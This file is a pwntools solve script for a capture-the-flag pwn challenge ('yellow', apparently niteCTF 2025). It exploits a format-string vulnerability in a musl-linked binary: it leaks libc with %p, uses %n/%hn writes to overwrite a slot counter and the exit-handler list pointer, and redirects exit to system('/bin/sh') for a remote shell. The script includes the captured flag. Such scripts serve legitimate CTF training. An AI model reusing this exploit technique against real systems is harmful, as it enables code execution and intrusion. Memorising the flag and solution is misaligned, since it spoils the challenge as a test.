#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("./libc.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break *action+279")
    else:
        r = remote("yellow.chals.nitectf25.live", 1337, ssl = True)

    return r


def create_character(index: int, character: int, name: bytes):
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b"enter index:\n", str(index).encode())
    r.sendlineafter(b">>", str(character).encode())
    r.sendafter(b">>", name)


def fight_boss(index: int, fmtstr: bytes, get_output: bool = False) -> bytes | None:
    r.sendlineafter(b">>", b"2")
    r.sendlineafter(b"enter index:", str(index).encode())
    r.sendlineafter(b"encounter and leave..", fmtstr)

    if get_output:
        r.recvuntil(b"adventurers..\n")
        return r.recvline()
    return None


# nite{b34TinG_yeLl0wk1ng_1n_ng+_w1thNo$$s}
def main():
    r = conn()

    libc.sym["characters_list"] = 0xc1ca0   # characters' list
    libc.sym["exit_handler"] = 0xc0d88      # exit handlers list
    libc.sym["slot"] = 0xc0fa4              # slot (this has to be set to a value >= 1)

    # Enable `printf` feedback
    create_character(0, 1, b"A" * 0x1f + b"\x00")

    # Leak libc (musl libc does not implement positional format specifiers like %7$p)
    leak = fight_boss(0, b"%p-%p-%p-%p-%p-%p\n", True).strip().split(b"-")
    libc.address = int(leak[5], 16) - (libc.sym.__stdin_FILE + 0x100)
    log.info(f"libc: 0x{libc.address:x}")

    # Prepare entries for the handler.
    # $rax will be set to the value we place in `slot` - 1 (in this case 0xb):
    #       0x0000772028e7db8e <+33>:    mov    r12,QWORD PTR [rdx+rax*8+0x108]
    #       0x0000772028e7db96 <+41>:    mov    rbp,QWORD PTR [rdx+rax*8+0x8]
    #       ...
    #       0x00007c6901b2abb4 <+71>:    mov    ecx,DWORD PTR [rip+0x7d3ea]     # 0x7c6901ba7fa4 <slot>
    #       0x00007c6901b2abba <+77>:    lea    eax,[rcx-0x1]
    for offset in range(3):
        create_character(1, 1, p64(libc.sym.system))

    for offset in range(5):
        create_character(2, 1, b"A" * 0x10 + p64(libc.search(b"/bin/sh\x00").__next__()))

    # Overwrite slot with a value >= 1.
    # We need to keep it into account when finding the right address for the list
    fmtstr = f"%c%c%c%c%c%c%c%c%c%c%c%c%llnAAAAAAAAAAAA".encode() + p64(libc.sym["slot"])
    fight_boss(0, fmtstr)

    # Overwrite the exit handlers list pointer to our controlled memory areas dedicated to characters
    target = (libc.sym["characters_list"] + 0x30) & 0xFFFF
    fmtstr = f"%c%c%c%c%c%c%c%c%c%c%c%{target - 11}c%hnAAAAAAAA".encode() + p64(libc.sym["exit_handler"])
    fight_boss(0, fmtstr)

    target = ((libc.sym["characters_list"] + 0x30) >> 16) & 0xFFFF
    fmtstr = f"%c%c%c%c%c%c%c%c%c%c%c%{target - 11}c%hnAAAAAAAA".encode() + p64(libc.sym["exit_handler"] + 0x2)
    fight_boss(0, fmtstr)

    target = ((libc.sym["characters_list"] + 0x30) >> 32) & 0x0000FFFF
    fmtstr = f"%c%c%c%c%c%c%c%c%c%c%c%{target - 11}c%llnAAAAAAA".encode() + p64(libc.sym["exit_handler"] + 0x4)
    fight_boss(0, fmtstr)

    # Exit from main and trigger the handler
    r.sendlineafter(b">>", b"3")
    r.interactive("$ ")


if __name__ == "__main__":
    main()
